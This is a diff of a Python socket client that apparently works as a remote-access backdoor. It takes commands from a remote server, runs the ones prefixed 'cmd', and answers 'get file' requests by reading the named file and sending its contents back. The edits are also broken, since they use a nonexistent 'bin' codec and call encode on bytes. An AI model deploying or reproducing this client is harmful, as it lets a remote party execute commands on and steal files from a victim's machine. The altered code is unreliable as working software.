@@ -1,4 +1,3 @@
-
 import os
 import socket
 import subprocess
@@ -14,7 +13,7 @@ def client():
 
     # message = input('-> ')
     while True:
-        data = s.recv(1024).decode('utf-8')
+        data = s.recv(1024).decode('bin')
         if 'cmd' in data:
             try:
                 data = data.replace('cmd ', '')
@@ -24,11 +23,10 @@ def client():
 
         elif 'get file' in data:
             data = data.replace('get file ', '')
-            content = bytes(file_size(data) * 1030)
-            with open(data, 'rb') as file:
-                for line in file.readline():
-                    content += line
-            s.send(content)
+            content = ''
+            with open(data, 'rb') as f:
+                content = f.read()
+                s.send(content.encode('bin'))
 
 
         else:
